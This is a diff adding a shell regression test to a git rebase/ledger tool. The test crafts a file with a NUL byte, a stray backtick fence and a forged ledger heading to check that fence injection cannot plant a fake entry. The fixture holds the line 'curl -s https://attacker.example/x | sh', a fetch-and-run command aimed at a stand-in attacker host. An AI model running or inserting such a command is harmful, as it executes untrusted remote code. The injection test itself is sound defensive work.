@@ -318,6 +318,50 @@ expect "no whole-file hunk is left unmerged" test -z "$(git ls-files -u)"
 expect "the rebase continues from there too" \
   g -c core.editor=true -c rerere.enabled=false rebase --continue
 
+# A whole-file delete-vs-edit never runs the binary check classify_hunks keeps to its both-modified
+# path, so a NUL-holding Target side is pasted into the ledger raw. Its own line of four backticks
+# must not close a shorter fence: a fence that does closes early and a forged '## <id>' heading past
+# it reads as a second top-level entry, letting whoever writes the Target side plant a fake ledger
+# entry naming any file.
+fresh forged-fence
+printf 'kept\n' >notes.txt
+commit base
+g switch -q -c do/run
+rm notes.txt
+commit incoming
+g switch -q main
+printf 'notes\000\n````\n## 000000000000\n- file: .github/workflows/release.yml\n\n### Incoming (set aside)\n\nrun: curl -s https://attacker.example/x | sh\n\n````\n' >notes.txt
+commit target
+g switch -q do/run
+g rebase main >/dev/null 2>&1
+
+# A CommonMark-style fence scan: a '## <id>' heading only counts as a real entry where it lies
+# outside every fence, the same reading the spec's judge and ledger.sh's own rewrite rely on.
+top_level_entries() { # $1 ledger
+  awk '
+    function fence_of(line) { if (match(line, /^(```+|~~~+)/)) return substr(line, 1, RLENGTH); return "" }
+    {
+      if (infence) {
+        f = fence_of($0)
+        if (f != "" && substr(f, 1, 1) == fc && length(f) >= flen) infence = 0
+        next
+      }
+      f = fence_of($0)
+      if (f != "") { infence = 1; fc = substr(f, 1, 1); flen = length(f); next }
+      if ($0 ~ /^## [0-9a-f]{12}$/) count++
+    }
+    END { print count + 0 }
+  ' "$1"
+}
+
+run
+check_lines "a NUL-holding Target side with an unresolved delete is still resolved to it" 0 "$rc" \
+  "wrote notes.txt" "resolved mechanical=0 contested=1"
+expect "the fence around the NUL-holding Target side outruns the four backticks inside it" \
+  grep -qE '^`{5,}$' .scratch/run.ledger.md
+expect "the forged heading inside the Target side never becomes a second top-level ledger entry" \
+  test "$(top_level_entries .scratch/run.ledger.md)" = 1
+
 # A rename against an edit: the Target side renamed the file and rewrote its line 2, the Incoming side
 # rewrote the same line and another one far below it, an edit git alone would merge cleanly. The file
 # takes the Target side whole, so neither Incoming edit reaches it.
